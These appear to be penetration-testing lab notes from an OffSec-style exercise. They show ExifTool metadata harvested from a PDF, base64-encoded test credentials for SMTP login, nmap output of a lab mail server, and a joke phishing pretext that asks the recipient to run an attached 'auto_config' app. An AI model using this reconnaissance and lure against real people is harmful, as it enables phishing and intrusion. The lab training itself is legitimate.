File Modification Date/Time     : 2023:09:09 00:19:13-07:00
File Access Date/Time           : 2023:09:09 00:19:24-07:00
File Inode Change Date/Time     : 2023:09:09 00:19:25-07:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 2
Language                        : de-DE
Tagged PDF                      : Yes
XMP Toolkit                     : Image::ExifTool 12.41
Creator                         : Dave Wizard
Title                           : Local Communication
Author                          : Dave Wizard
Producer                        : Microsoft® PowerPoint® for Microsoft 365
Create Date                     : 2022:05:17 15:16:38+02:00
Creator Tool                    : Microsoft® PowerPoint® for Microsoft 365
Modify Date                     : 2022:05:17 15:16:38+02:00
Document ID                     : uuid:EAB0BD66-875C-4E2E-900D-ECCD665BAAA0
Instance ID                     : uuid:EAB0BD66-875C-4E2E-900D-ECCD665BAAA0
Title                           : Local Communication
Author                          : Dave Wizard
Create Date                     : 2022:05:17 15:16:38+02:00
Modify Date                     : 2022:05:17 15:16:38+02:00
Producer                        : Microsoft® PowerPoint® for Microsoft 365
Creator                         : Dave Wizard


┌──(operator㉿labhost)-[~/OffSec/win-library-files]
└─$ nodejs
Welcome to Node.js v18.13.0.
Type ".help" for more information.
> btoa('test@supermagicorg.com')
'dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQ=='
> btoa('test')
'dGVzdA=='
> atob('VXNlcm5hbWU6')
'Username:'
> atob('UGFzc3dvcmQ6')
'Password:'

PORT    STATE SERVICE
25/tcp  open  smtp
| smtp-commands: ADMIN, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp open  pop3
143/tcp open  imap
587/tcp open  submission
| smtp-commands: ADMIN, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
```
- `192.168.206.199`
- A valid company email will be `dave.wizard@supermagicorg.com`
- We have test u/p from PDF.
	- `test@supermagicorg.com`
	- `test`
- The SMTP Telnet connection will expect Base64 encoded u/p.
	- `dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQo=`
 - `dGVzdAo=` .
- Pretext (Hackers opening scene, 50% of the time it works every time);
```
Hi Dave! This is Mr. Eddie Vedder, from Accounting. I just had a power surge here at home that wiped out a file I was working on. Listen, I'm in big trouble, do you know anything about computers? Right, well my BLT drive on my computer just went AWOL, and I've got this big project due tomorrow for Mr. Kawasaki, and if I don't get it in, he's gonna ask me to commit Hari Kari... Yeah, well, you know these Japanese management techniques. Could you open the attached config folder and run the auto_config app?
```
